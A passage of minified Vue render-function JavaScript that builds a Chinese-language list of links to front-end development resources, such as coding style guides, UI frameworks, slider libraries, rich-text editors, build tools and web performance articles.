地址")]),t("p",[t("a",{attrs:{href:"http://alloyteam.github.io/CodeGuide",target:"_blank"}},[n._v("通过分析github代码库总结出来的工程师代码书写习惯")])]),t("p",[t("a",{attrs:{href:"http://codeguide.bootcss.com",target:"_blank"}},[n._v("HTML&CSS编码规范 by @mdo")])]),t("p",[t("a",{attrs:{href:"http://www.alloyteam.com/2011/10/css-on-team-naming/",target:"_blank"}},[n._v("团队合作的css命名规范-腾讯AlloyTeam前端团队")])]),t("p",[t("a",{attrs:{href:"http://yuwenhui.github.io",target:"_blank"}},[n._v("前端编码规范之js - by yuwenhui")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/hustskyking/p/javascript-spec.html",target:"_blank"}},[n._v("前端编码规范之js - by 李靖")])]),t("p",[t("a",{attrs:{href:"http://zhibimo.com/read/Ashu/front-end-style-guide",target:"_blank"}},[n._v("前端开发规范手册")])]),t("p",[t("a",{attrs:{href:"https://github.com/yuche/javascript#table-of-contents",target:"_blank"}},[n._v("Airbnb JavaScript\n                    编码规范（简体中文版）")])]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/question/20351507",target:"_blank"}},[n._v("AMD与CMD规范的区别")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/tugenhua0707/p/3507957.html",target:"_blank"}},[n._v("AMD与CMD规范的区别")])]),t("p",[t("a",{attrs:{href:"http://docs.kissyui.com/1.4/docs/html/tutorials/style-guide/kissy-source-style.html",target:"_blank"}},[n._v("KISSY 源码规范")])]),t("p",[t("a",{attrs:{href:"http://codeguide.bootcss.com",target:"_blank"}},[n._v("bt编码规范")])]),t("p",[t("a",{attrs:{href:"https://github.com/Suxiaogang/Code_Guide",target:"_blank"}},[n._v("规范加强版")])]),t("p",[t("a",{attrs:{href:"http://blog.jobbole.com/79075",target:"_blank"}},[n._v("前端代码规范 及 最佳实践")])]),t("p",[t("a",{attrs:{href:"http://coderlmn.github.io/code-standards",target:"_blank"}},[n._v("百度前端规范")])]),t("p",[t("a",{attrs:{href:"http://isobar-idev.github.io/code-standards",target:"_blank"}},[n._v("百度前端规范")])]),t("p",[t("a",{attrs:{href:"http://zhuanlan.zhihu.com/fuyun/19884834",target:"_blank"}},[n._v("百度前端规范")])]),t("p",[t("a",{attrs:{href:"https://github.com/gf-rd/es6-coding-style",target:"_blank"}},[n._v("ECMAScript6 编码规范--广发证券前端团队")])]),t("p",[t("a",{attrs:{href:"http://blog.jobbole.com/79484",target:"_blank"}},[n._v("JavaScript 风格指南/编码规范（Airbnb公司版）")])]),t("p",[t("a",{attrs:{href:"http://nec.netease.com/standard",target:"_blank"}},[n._v("网易前端开发规范")])]),t("p",[t("a",{attrs:{href:"http://www.75team.com/archives/1049",target:"_blank"}},[n._v("css模块")])]),t("p",[t("a",{attrs:{href:"https://github.com/ecomfe/spec",target:"_blank"}},[n._v("前端规范资源列表")])]),t("p",[n._v("PHP")]),t("p",[n._v("PHP 地址")]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000000443795",target:"_blank"}},[n._v("最流行的PHP 代码规范")])]),t("p",[t("a",{attrs:{href:"https://github.com/hfcorriez/fig-standards/blob/zh_CN/%E6%8E%A5%E5%8F%97/PSR-2-coding-style-guide.md",target:"_blank"}},[n._v("最流行的PHP 代码规范")])]),t("p",[n._v("各大公司开源项目")]),t("p",[n._v("各大公司开源项目 地址")]),t("p",[t("a",{attrs:{href:"https://code.facebook.com/projects/web",target:"_blank"}},[n._v("Facebook Projects")])]),t("p",[t("a",{attrs:{href:"http://fex.baidu.com",target:"_blank"}},[n._v("百度web前端研发部")])]),t("p",[t("a",{attrs:{href:"http://efe.baidu.com",target:"_blank"}},[n._v("百度EFE")])]),t("p",[t("a",{attrs:{href:"https://github.com/fex-team",target:"_blank"}},[n._v("百度github")])]),t("p",[t("a",{attrs:{href:"http://www.alloyteam.com",target:"_blank"}},[n._v("alloyteam")])]),t("p",[t("a",{attrs:{href:"http://alloyteam.github.io",target:"_blank"}},[n._v("alloyteam-github")])]),t("p",[t("a",{attrs:{href:"https://github.com/AlloyTeam/AlloyGameEngine",target:"_blank"}},[n._v("alloyteam-AlloyGameEngine")])]),t("p",[t("a",{attrs:{href:"http://alloyteam.github.io/AlloyDesigner",target:"_blank"}},[n._v("AlloyDesigner")])]),t("p",[t("a",{attrs:{href:"http://www.alloyteam.com/2015/06/h5-jiao-hu-ye-bian-ji-qi-aeditor-jie-shao",target:"_blank"}},[n._v("H5交互页编辑器AEditor介绍")])]),t("p",[t("a",{attrs:{href:"http://aeditor.alloyteam.com",target:"_blank"}},[n._v("AEditor")])]),t("p",[t("a",{attrs:{href:"http://forum.maka.im/wordpress",target:"_blank"}},[n._v("maka")])]),t("p",[t("a",{attrs:{href:"https://github.com/fenbility/weekly-feed",target:"_blank"}},[n._v("值得订阅的weekly")])]),t("p",[t("a",{attrs:{href:"http://cube.qq.com",target:"_blank"}},[n._v("腾讯html5")])]),t("p",[t("a",{attrs:{href:"http://75team.github.io",target:"_blank"}},[n._v("奇舞团开源项目")])]),t("p",[t("a",{attrs:{href:"http://ued.qunar.com",target:"_blank"}},[n._v("Qunar UED")])]),t("p",[t("a",{attrs:{href:"http://scrat.io",target:"_blank"}},[n._v("Scrat")])]),t("p",[n._v("常用")]),t("p",[n._v("常用 地址")]),t("p",[t("a",{attrs:{href:"http://www.zhangxinxu.com/wordpress/2013/12/iebetter-js-make-ie6-ie8-like-modern-browser-ie9-chrome",target:"_blank"}},[n._v("ieBetter.js-让IE6-IE8拥有IE9+,Chrome等浏览器特性")])]),t("p",[t("a",{attrs:{href:"http://mottie.github.io/Keyboard",target:"_blank"}},[n._v("模拟键盘")])]),t("p",[t("a",{attrs:{href:"https://github.com/hotoo/pinyin",target:"_blank"}},[n._v("拼音")])]),t("p",[t("a",{attrs:{href:"https://github.com/mc-zone/IDValidator",target:"_blank"}},[n._v("中国个人身份证号验证")])]),t("p",[n._v("算法")]),t("p",[n._v("算法 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/Ralph-Wang/algorithm.in.js",target:"_blank"}},[n._v("数据结构与算法 JavaScript 描述. 章节练习")])]),t("p",[t("a",{attrs:{href:"https://github.com/twobin/twobinSort",target:"_blank"}},[n._v("常见排序算法（JS版）")])]),t("p",[t("a",{attrs:{href:"https://github.com/luofei2011/jsAgm/blob/master/js/sort.js",target:"_blank"}},[n._v("经典排序")])]),t("p",[t("a",{attrs:{href:"https://github.com/hechangmin/jssort",target:"_blank"}},[n._v("常见排序算法-js版本")])]),t("p",[t("a",{attrs:{href:"https://github.com/lightningtgc/JavaScript-Algorithms",target:"_blank"}},[n._v("JavaScript 算法与数据结构 精华集")])]),t("p",[t("a",{attrs:{href:"http://www.nowcoder.com/live/courses",target:"_blank"}},[n._v("面试常考算法题精讲")])]),t("p",[n._v("移动端")]),t("p",[n._v("移动端 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/ftlabs/fastclick",target:"_blank"}},[n._v("fastclick")])]),t("p",[t("a",{attrs:{href:"https://github.com/mmastrac/jquery-noclickdelay",target:"_blank"}},[n._v("no-click-delay")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/lcw/p/3619181.html",target:"_blank"}},[n._v("【敏捷开发】Android团队开发规范")])]),t("p",[t("a",{attrs:{href:"http://www.jianshu.com/p/4390f4fe19b3",target:"_blank"}},[n._v("Android 开发规范与应用")])]),t("p",[t("a",{attrs:{href:"https://github.com/ychow/ionic-guide",target:"_blank"}},[n._v("ionic")])]),t("p",[n._v("JSON")]),t("p",[n._v("JSON 地址")]),t("p",[t("a",{attrs:{href:"http://beta.json-generator.com",target:"_blank"}},[n._v("模拟生成JSON数据")])]),t("p",[t("a",{attrs:{href:"http://jsonp.afeld.me",target:"_blank"}},[n._v("返回跨域JSONAPI")])]),t("p",[n._v("焦点图")]),t("p",[n._v("焦点图 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/koen301/myfocus",target:"_blank"}},[n._v("myfocus")])]),t("p",[t("a",{attrs:{href:"http://www.chhua.com/myfocus",target:"_blank"}},[n._v("myfocus-官方演示站")])]),t("p",[t("a",{attrs:{href:"http://www.superslide2.com",target:"_blank"}},[n._v("SuperSlidev2.1 -- 大话主席")])]),t("p",[t("a",{attrs:{href:"http://www.bujichong.com/sojs/soChange/index.html",target:"_blank"}},[n._v("soChange")])]),t("p",[n._v("Ext, EasyUI, J-UI 及其它各种UI方案")]),t("p",[n._v("Ext, EasyUI, J-UI 及其它各种UI方案 地址")]),t("p",[t("a",{attrs:{href:"https://www.sencha.com/products/extjs",target:"_blank"}},[n._v("extjs")])]),t("p",[t("a",{attrs:{href:"http://docs.sencha.com/extjs/4.0.7",target:"_blank"}},[n._v("ext4英文api")])]),t("p",[t("a",{attrs:{href:"http://extjs-doc-cn.github.io/ext4api",target:"_blank"}},[n._v("ext4中文api")])]),t("p",[t("a",{attrs:{href:"http://jquery-easyui.googlecode.com/svn/trunk/src",target:"_blank"}},[n._v("jquery easyui 未压缩源代码")])]),t("p",[t("a",{attrs:{href:"http://jui.org",target:"_blank"}},[n._v("J-UI")])]),t("p",[t("a",{attrs:{href:"http://dcloudio.github.io/mui",target:"_blank"}},[n._v("MUI-最接近原生APP体验的高性能前端框架")])]),t("p",[n._v("Amaze UI 中国首个开源 HTML5 跨屏前端框架")]),t("p",[t("a",{attrs:{href:"http://m.sui.taobao.org",target:"_blank"}},[n._v("淘宝 HTML5 前端框架")])]),t("p",[t("a",{attrs:{href:"http://docs.kissyui.com",target:"_blank"}},[n._v("KISSY - 阿里前端JavaScript库")])]),t("p",[t("a",{attrs:{href:"http://nej.netease.com",target:"_blank"}},[n._v("网易Nej - Nice Easy Javascript")])]),t("p",[t("a",{attrs:{href:"http://demos.telerik.com/kendo-ui/mvvm/index",target:"_blank"}},[n._v("Kendo UI MVVM Demo")])]),t("p",[t("a",{attrs:{href:"http://www.bootcss.com",target:"_blank"}},[n._v("Bootstrap")])]),t("p",[t("a",{attrs:{href:"http://smartui.chinamzz.com",target:"_blank"}},[n._v("Smart UI")])]),t("p",[t("a",{attrs:{href:"http://developer.yahoo.com/yui/grids",target:"_blank"}},[n._v("雅虎UI - CSS UI")])]),t("p",[n._v("页面 社会化 分享功能")]),t("p",[n._v("页面 社会化 分享功能 地址")]),t("p",[t("a",{attrs:{href:"http://share.baidu.com",target:"_blank"}},[n._v("百度分享")])]),t("p",[t("a",{attrs:{href:"http://jiathis.com",target:"_blank"}},[n._v("JiaThis")])]),t("p",[t("a",{attrs:{href:"http://developer.baidu.com/soc/share",target:"_blank"}},[n._v("社会化分享组件")])]),t("p",[t("a",{attrs:{href:"http://www.mob.com/#/index",target:"_blank"}},[n._v("ShareSDK 轻松实现社会化功能")])]),t("p",[t("a",{attrs:{href:"http://dev.umeng.com/social/android/quick-integration",target:"_blank"}},[n._v("友盟分享")])]),t("p",[n._v("富文本编辑器")]),t("p",[n._v("富文本编辑器 地址")]),t("p",[t("a",{attrs:{href:"https://www.tinymce.com",target:"_blank"}},[n._v("功能齐全 tinymce")])]),t("p",[t("a",{attrs:{href:"http://ueditor.baidu.com/website",target:"_blank"}},[n._v("百度 ueditor")])]),t("p",[t("a",{attrs:{href:"http://ckeditor.com",target:"_blank"}},[n._v("经典的ckeditor")])]),t("p",[t("a",{attrs:{href:"http://kindeditor.net",target:"_blank"}},[n._v("经典的kindeditor")])]),t("p",[t("a",{attrs:{href:"http://www.bootcss.com/p/bootstrap-wysiwyg",target:"_blank"}},[n._v("wysiwyg")])]),t("p",[t("a",{attrs:{href:"http://integ.github.io/BachEditor",target:"_blank"}},[n._v("一个有情怀的编辑器。Bach's Editor")])]),t("p",[t("a",{attrs:{href:"https://github.com/mycolorway/simditor",target:"_blank"}},[n._v("tower用的编辑器")])]),t("p",[t("a",{attrs:{href:"https://github.com/summernote/summernote",target:"_blank"}},[n._v("summernote 编辑器")])]),t("p",[t("a",{attrs:{href:"http://neilj.github.io/Squire",target:"_blank"}},[n._v("html5编辑器")])]),t("p",[t("a",{attrs:{href:"http://lab.hustlzp.com/XEditor",target:"_blank"}},[n._v("XEditor")])]),t("p",[t("a",{attrs:{href:"https://github.com/wangfupeng1988/wangEditor",target:"_blank"}},[n._v("wangEditor")])]),t("p",[n._v("前端概述")]),t("p",[n._v("前端概述 地址")]),t("p",[t("a",{attrs:{href:"http://www.awesomes.cn",target:"_blank"}},[n._v("前端工具大全")])]),t("p",[t("a",{attrs:{href:"https://github.com/fouber/blog/issues/10?from=timeline&isappinstalled=0#",target:"_blank"}},[n._v("什么是前端工程化")])]),t("p",[n._v("Gulp")]),t("p",[n._v("Gulp 地址")]),t("p",[t("a",{attrs:{href:"http://gulpjs.com",target:"_blank"}},[n._v("Gulp官网")])]),t("p",[t("a",{attrs:{href:"http://www.gulpjs.com.cn",target:"_blank"}},[n._v("Gulp中文网")])]),t("p",[t("a",{attrs:{href:"https://github.com/Platform-CUF/use-gulp",target:"_blank"}},[n._v("gulp资料收集")])]),t("p",[t("a",{attrs:{href:"http://javascript.ruanyifeng.com/tool/gulp.html",target:"_blank"}},[n._v("Gulp：任务自动管理工具 - ruanyifeng")])]),t("p",[t("a",{attrs:{href:"http://gulpjs.com/plugins",target:"_blank"}},[n._v("Gulp插件")])]),t("p",[t("a",{attrs:{href:"http://www.jeffjade.com/2015/11/25/2015-11-25-toss-gulp/",target:"_blank"}},[n._v("Gulp探究折腾之路(I)")])]),t("p",[t("a",{attrs:{href:"http://www.jeffjade.com/2016/01/19/2016-01-19-toss-gulp/",target:"_blank"}},[n._v("Gulp折腾之路(II)")])]),t("p",[t("a",{attrs:{href:"http://www.ido321.com/1622.html",target:"_blank"}},[n._v("Gulp不完全入门教程")])]),t("p",[t("a",{attrs:{href:"https://github.com/hjzheng/CUF_meeting_knowledge_share/issues/33",target:"_blank"}},[n._v("为什么使用gulp?")])]),t("p",[t("a",{attrs:{href:"http://www.dbpoo.com/getting-started-with-gulp",target:"_blank"}},[n._v("Gulp安装及配合组件构建前端开发一体化")])]),t("p",[t("a",{attrs:{href:"https://github.com/nimojs/gulp-book",target:"_blank"}},[n._v("Gulp 入门指南")])]),t("p",[t("a",{attrs:{href:"https://github.com/nimojs/blog/issues/19",target:"_blank"}},[n._v("Gulp 入门指南 - nimojs")])]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/video/5692",target:"_blank"}},[n._v("Gulp in Action")])]),t("p",[t("a",{attrs:{href:"http://www.w3ctech.com/topic/134",target:"_blank"}},[n._v("Gulp开发教程（翻译）")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/2050/p/4198792.html",target:"_blank"}},[n._v("前端构建工具gulpjs的使用介绍及技巧")])]),t("p",[n._v("Grunt")]),t("p",[n._v("Grunt 地址")]),t("p",[t("a",{attrs:{href:"http://gruntjs.com",target:"_blank"}},[n._v("gruntjs")])]),t("p",[t("a",{attrs:{href:"http://www.gruntjs.net",target:"_blank"}},[n._v("Grunt中文网")])]),t("p",[n._v("Fis")]),t("p",[n._v("Fis 地址")]),t("p",[t("a",{attrs:{href:"http://fex-team.github.io/fis-site/index.html",target:"_blank"}},[n._v("fis 官网")])]),t("p",[t("a",{attrs:{href:"http://fis.baidu.com",target:"_blank"}},[n._v("fis")])]),t("p",[n._v("pc图轮")]),t("p",[n._v("pc图轮 地址")]),t("p",[t("a",{attrs:{href:"http://www.jsfoot.com/jquery/demo/2011-09-20/192.html",target:"_blank"}},[n._v("单屏轮播sochange")])]),t("p",[t("a",{attrs:{href:"http://bxslider.com/examples/carousel-demystified",target:"_blank"}},[n._v("左右按钮多图切换")])]),t("p",[t("a",{attrs:{href:"https://github.com/alvarotrigo/fullPage.js",target:"_blank"}},[n._v("fullpage全屏轮播")])]),t("p",[n._v("移动端图轮")]),t("p",[n._v("移动端图轮 地址")]),t("p",[t("a",{attrs:{href:"http://www.swipejs.com",target:"_blank"}},[n._v("无缝切换")])]),t("p",[t("a",{attrs:{href:"http://www.idangero.us/swiper",target:"_blank"}},[n._v("滑屏效果")])]),t("p",[t("a",{attrs:{href:"https://github.com/peunzhang/fullpage",target:"_blank"}},[n._v("全屏fullpage")])]),t("p",[t("a",{attrs:{href:"https://github.com/qiqiboy/touchslider",target:"_blank"}},[n._v("单个图片切换")])]),t("p",[t("a",{attrs:{href:"https://github.com/peunzhang/slip.js",target:"_blank"}},[n._v("单个全屏切换")])]),t("p",[t("a",{attrs:{href:"http://touch.code.baidu.com/examples.html?qq-pf-to=pcqq.group",target:"_blank"}},[n._v("百度的切换库")])]),t("p",[t("a",{attrs:{href:"https://github.com/peunzhang/iSlider",target:"_blank"}},[n._v("单个全屏切换")])]),t("p",[t("a",{attrs:{href:"https://github.com/saw/touch-interfaces",target:"_blank"}},[n._v("滑屏效果")])]),t("p",[t("a",{attrs:{href:"http://baijs.com/tinycircleslider",target:"_blank"}},[n._v("旋转拖动设置")])]),t("p",[t("a",{attrs:{href:"http://touchslider.com",target:"_blank"}},[n._v("类似于swipe切换")])]),t("p",[t("a",{attrs:{href:"http://www.swiper.com.cn/demo/index.html",target:"_blank"}},[n._v("支持多种形式的触摸滑动")])]),t("p",[t("a",{attrs:{href:"https://github.com/joker-ye/main/blob/master/wap/index.html",target:"_blank"}},[n._v("滑屏效果")])]),t("p",[t("a",{attrs:{href:"http://www.superslide2.com",target:"_blank"}},[n._v("大话主席pc移动图片轮换")])]),t("p",[t("a",{attrs:{href:"https://github.com/hahnzhu/parallax.js",target:"_blank"}},[n._v("滑屏效果")])]),t("p",[t("a",{attrs:{href:"https://github.com/yanhaijing/zepto.fullpage",target:"_blank"}},[n._v("基于zepto的fullpage")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/plums/archive/2013/01/10/WebApp-fixed-width-layout-of-multi-terminal-adapter-since.html",target:"_blank"}},[n._v("[WebApp]定宽网页设计下，固定宽度布局开发WebApp并实现多终端下WebApp布局自适应")])]),t("p",[t("a",{attrs:{href:"http://loo2k.com/blog/detecting-wechat-client",target:"_blank"}},[n._v("判断微信客户端的那些坑")])]),t("p",[t("a",{attrs:{href:"https://github.com/JefferyWang/nativeShare.js",target:"_blank"}},[n._v("可以通过javascript直接调用原生分享的工具")])]),t("p",[t("a",{attrs:{href:"http://www.jiathis.com/help/html/weixin-share-code",target:"_blank"}},[n._v("JiaThis 分享到微信代码")])]),t("p",[t("a",{attrs:{href:"http://fex.baidu.com/blog/2015/05/cross-mobile",target:"_blank"}},[n._v("聊聊移动端跨平台开发的各种技术")])]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/question/29922082",target:"_blank"}},[n._v("前端自动化测试")])]),t("p",[t("a",{attrs:{href:"http://ajccom.github.io/niceslider",target:"_blank"}},[n._v("多种轮换图片")])]),t("p",[t("a",{attrs:{href:"https://mango.github.io/slideout",target:"_blank"}},[n._v("滑动侧边栏")])]),t("p",[n._v("文件上传")]),t("p",[n._v("文件上传 地址")]),t("p",[t("a",{attrs:{href:"http://fex.baidu.com/webuploader",target:"_blank"}},[n._v("百度上传组件")])]),t("p",[t("a",{attrs:{href:"https://blueimp.github.io/jQuery-File-Upload",target:"_blank"}},[n._v("上传")])]),t("p",[t("a",{attrs:{href:"http://www.hdfu.net",target:"_blank"}},[n._v("flash 头像上传")])]),t("p",[t("a",{attrs:{href:"http://www.dropzonejs.com",target:"_blank"}},[n._v("图片上传预览")])]),t("p",[t("a",{attrs:{href:"http://elemefe.github.io/image-cropper",target:"_blank"}},[n._v("图片裁剪")])]),t("p",[t("a",{attrs:{href:"http://www.shearphoto.com",target:"_blank"}},[n._v("图片裁剪-shearphoto")])]),t("p",[t("a",{attrs:{href:"http://www.oschina.net/project/tag/284/jquery-image-tools?lang=0&os=0&sort=view&p=2",target:"_blank"}},[n._v("jQuery图片处理")])]),t("p",[n._v("模拟select")]),t("p",[n._v("模拟select 地址")]),t("p",[t("a",{attrs:{href:"http://aui.github.io/popupjs/doc/selectbox.html",target:"_blank"}},[n._v("糖饼 select")])]),t("p",[t("a",{attrs:{href:"https://github.com/rmm5t/jquery-flexselect",target:"_blank"}},[n._v("flexselect")])]),t("p",[t("a",{attrs:{href:"http://loudev.com",target:"_blank"}},[n._v("双select")])]),t("p",[t("a",{attrs:{href:"http://select2.github.io",target:"_blank"}},[n._v("select2")])]),t("p",[n._v("取色插件")]),t("p",[n._v("取色插件 地址")]),t("p",[t("a",{attrs:{href:"http://www.jq22.com/plugin/367",target:"_blank"}},[n._v("类似 Photoshop 的界面取色插件")])]),t("p",[t("a",{attrs:{href:"https://github.com/jquery/jquery-color",target:"_blank"}},[n._v("jquery color")])]),t("p",[t("a",{attrs:{href:"http://www.oschina.net/project/tag/287/color-picker",target:"_blank"}},[n._v("取色插件集合")])]),t("p",[t("a",{attrs:{href:"https://github.com/mattfarina/farbtastic",target:"_blank"}},[n._v("farbtastic 圆环＋正方形")])]),t("p",[n._v("城市联动")]),t("p",[n._v("城市联动 地址")]),t("p",[t("a",{attrs:{href:"http://www.ijquery.cn/?p=360",target:"_blank"}},[n._v("jquery.cityselect.js基于jQuery+JSON的省市或自定义联动效果")])]),t("p",[n._v("剪贴板")]),t("p",[n._v("剪贴板 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/zeroclipboard/zeroclipboard",target:"_blank"}},[n._v("剪贴板")])]),t("p",[t("a",{attrs:{href:"http://zenorocha.github.io/clipboard.js",target:"_blank"}},[n._v("clipboard 最新的剪切方案")])]),t("p",[t("a",{attrs:{href:"https://github.com/zenorocha/clipboard.js",target:"_blank"}},[n._v("不是Flash的剪贴板")])]),t("p",[n._v("简繁转换")]),t("p",[n._v("简繁转换 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/BYVoid/OpenCC",target:"_blank"}},[n._v("简繁转换")])]),t("p",[n._v("表格 Grid")]),t("p",[n._v("表格 Grid 地址")]),t("p",[t("a",{attrs:{href:"http://facebook.github.io/fixed-data-table",target:"_blank"}},[n._v("facebook表格")])]),t("p",[t("a",{attrs:{href:"http://handsontable.com",target:"_blank"}},[n._v("类似于Excel编辑表格-handsontable")])]),t("p",[t("a",{attrs:{href:"http://bootstrap-table.wenzhixin.net.cn",target:"_blank"}},[n._v("bootstrap-table插件")])]),t("p",[t("a",{attrs:{href:"https://www.datatables.net",target:"_blank"}},[n._v("datatables")])]),t("p",[n._v("在线演示")]),t("p",[n._v("在线演示 地址")]),t("p",[t("a",{attrs:{href:"http://runjs.cn",target:"_blank"}},[n._v("js 在线编辑 - runjs")])]),t("p",[t("a",{attrs:{href:"http://jsbin.com",target:"_blank"}},[n._v("js 在线编辑 - jsbin")])]),t("p",[t("a",{attrs:{href:"http://codepen.io",target:"_blank"}},[n._v("js 在线编辑 - codepen")])]),t("p",[t("a",{attrs:{href:"http://jsfiddle.net",target:"_blank"}},[n._v("js 在线编辑 - jsfiddle")])]),t("p",[t("a",{attrs:{href:"http://ideone.com",target:"_blank"}},[n._v("java 在线编辑 - runjs")])]),t("p",[t("a",{attrs:{href:"http://code.hcharts.cn",target:"_blank"}},[n._v("js 在线编辑 - hcharts")])]),t("p",[t("a",{attrs:{href:"http://jsdm.com",target:"_blank"}},[n._v("js 在线编辑 - jsdm")])]),t("p",[t("a",{attrs:{href:"http://sqlfiddle.com",target:"_blank"}},[n._v("sql 在线编辑 - sqlfiddle")])]),t("p",[t("a",{attrs:{href:"https://thimble.mozilla.org",target:"_blank"}},[n._v("mozilla 在线编辑器")])]),t("p",[n._v("常规优化")]),t("p",[n._v("常规优化 地址")]),t("p",[t("a",{attrs:{href:"http://www.infoq.com/cn/articles/javascript-high-performance-animation-and-page-rendering",target:"_blank"}},[n._v("Javascript高性能动画与页面渲染")])]),t("p",[t("a",{attrs:{href:"http://isux.tencent.com/h5-performance.html",target:"_blank"}},[n._v("移动H5前端性能优化指南")])]),t("p",[t("a",{attrs:{href:"http://ued.5173.com/?p=1731",target:"_blank"}},[n._v("5173首页前端性能优化实践")])]),t("p",[t("a",{attrs:{href:"http://www.uisdc.com/front-end-performance-for-web-designers-and-front-end-developers",target:"_blank"}},[n._v("给网页设计师和前端开发者看的前端性能优化")])]),t("p",[t("a",{attrs:{href:"http://www.orzpoint.com/profiling-css-and-optimization-notes",target:"_blank"}},[n._v("复杂应用的 CSS\n                    性能分析和优化建议")])]),t("p",[n._v("张鑫旭——前端性能 张鑫旭——前端性能")]),t("p",[t("a",{attrs:{href:"http://www.xiaoqiang.org/javascript/font-end-performance-monitor.html",target:"_blank"}},[n._v("前端性能监控总结")])]),t("p",[n._v("网站性能优化之CSS无图片技术 网站性能优化之CSS无图片技术")]),t("p",[n._v("web前端性能优化进阶路 web前端性能优化进阶路")]),t("p",[t("a",{attrs:{href:"http://my.eoe.cn/tuwandou/archive/4544.html",target:"_blank"}},[n._v("前端技术：网站性能优化之CSS无图片技术")])]),t("p",[t("a",{attrs:{href:"http://www.baiduux.com/blog/2011/02/15/browser-loading",target:"_blank"}},[n._v("浏览器的加载与页面性能优化")])]),t("p",[t("a",{attrs:{href:"http://www.w3ctech.com/p/1503",target:"_blank"}},[n._v("页面加载中的图片性能优化")])]),t("p",[n._v("Hey——前端性能 Hey——前端性能")]),t("p",[n._v("html优化 html优化")]),t("p",[n._v("99css——性能 99css——性能")]),t("p",[t("a",{attrs:{href:"http://www.yslow.net/category.php?cid=20",target:"_blank"}},[n._v("Yslow——性能优化")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/yslow",target:"_blank"}},[n._v("YSLOW中文介绍")])]),t("p",[t("a",{attrs:{href:"http://www.360ito.com/article/40.html",target:"_blank"}},[n._v("转一篇Yahoo关于网站性能优化的文章，兼谈本站要做的优化")])]),t("p",[t("a",{attrs:{href:"http://www.360doc.com/content/10/0928/09/2588264_56971287.shtml",target:"_blank"}},[n._v("Yahoo!团队实践分享：网站性能")])]),t("p",[t("a",{attrs:{href:"http://blog.jiasule.com/i/153",target:"_blank"}},[n._v("网站性能优化指南：什么使我们的网站变慢？")])]),t("p",[t("a",{attrs:{href:"http://www.powereasy.net/helpyou/knowledge/ecommerce/9593.html",target:"_blank"}},[n._v("网站性能优化实践，减少加载时间，提高用户体验")])]),t("p",[t("a",{attrs:{href:"http://www.umtry.com/archives/747.html",target:"_blank"}},[n._v("浅谈网站性能优化 前端篇")])]),t("p",[t("a",{attrs:{href:"http://www.adinnet.cn/blog/designview/2012-7-12/678.html",target:"_blank"}},[n._v("前端重构实践之如何对网站性能优化？")])]),t("p",[t("a",{attrs:{href:"http://www.gbin1.com/technology/javascript/20130708-front-end-performance-optimization-9",target:"_blank"}},[n._v("前端性能优化：使用媒体查询加载指定大小的背景图片")])]),t("p",[t("a",{attrs:{href:"http://www.mykuer.com/post/factors-that-affect-the-speed-of-web-site-open.html",target:"_blank"}},[n._v("网站性能系列博文")])]),t("p",[t("a",{attrs:{href:"http://tgideas.qq.com/webplat/info/news_version3/804/808/811/m579/201109/41355.shtml",target:"_blank"}},[n._v("加载，不只是少一点点")])]),t("p",[t("a",{attrs:{href:"http://mzhou.me/article/95310",target:"_blank"}},[n._v("前端性能的测试与优化")])]),t("p",[t("a",{attrs:{href:"http://www.gbin1.com/technology/html/20130217-tips-for-speed-up-page-loading",target:"_blank"}},[n._v("分享网页加载速度优化的一些技巧？")])]),t("p",[t("a",{attrs:{href:"http://www.f2es.com/images-bytes-opt",target:"_blank"}},[n._v("页面加载中的图片性能优化")])]),t("p",[t("a",{attrs:{href:"http://www.tcreator.info/webSchool/website/Front-end-Opt-Yslow.html",target:"_blank"}},[n._v("web前端优化(基于Yslow")])]),t("p",[t("a",{attrs:{href:"https://www.qianduan.net/website-performance-optimization-tool.html",target:"_blank"}},[n._v("网站性能优化工具大全")])]),t("p",[t("a",{attrs:{href:"http://www.alloyteam.com/2012/10/high-performance-html",target:"_blank"}},[n._v("【高性能前端1】高性能HTML")])]),t("p",[t("a",{attrs:{href:"http://www.alloyteam.com/2012/10/high-performance-css",target:"_blank"}},[n._v("【高性能前端2】高性能CSS")])]),t("p",[t("a",{attrs:{href:"http://coolshell.cn/articles/6470.html",target:"_blank"}},[n._v("由12306谈谈网站前端性能和后端性能优化")])]),t("p",[n._v("AlloyTeam——前端优化 AlloyTeam——前端优化")]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/developersupport/p/3248695.html",target:"_blank"}},[n._v("毫秒必争，前端网页性能最佳实践")])]),t("p",[t("a",{attrs:{href:"http://blog.sina.com.cn/s/blog_6e9d2e0701017kvu.html",target:"_blank"}},[n._v("网站性能工具Yslow的使用方法")])]),t("p",[t("a",{attrs:{href:"http://www.infoq.com/cn/articles/front-end-engineering-and-performance-optimization-part1",target:"_blank"}},[n._v("前端工程与性能优化（上）：静态资源版本更新与缓存")])]),t("p",[t("a",{attrs:{href:"http://www.infoq.com/cn/articles/front-end-engineering-and-performance-optimization-part2",target:"_blank"}},[n._v("前端工程与性能优化（下）：静态资源管理与模板框架")])]),t("p",[t("a",{attrs:{href:"http://blog.jobbole.com/48369",target:"_blank"}},[n._v("HTTPS连接的前几毫秒发生了什么")])]),t("p",[t("a",{attrs:{href:"http://uicss.cn/yslow/#more-12319",target:"_blank"}},[n._v("Yslow")])]),t("p",[t("a",{attrs:{href:"http://blog.smartbear.com/web-performance/essential-web-performance-metrics-a-primer-part-1",target:"_blank"}},[n._v("Essential Web Performance Metrics — A Primer, Part 1")])]),t("p",[t("a",{attrs:{href:"http://blog.smartbear.com/performance/essential-web-performance-metrics-part-2",target:"_blank"}},[n._v("Essential Web Performance Metrics — Part 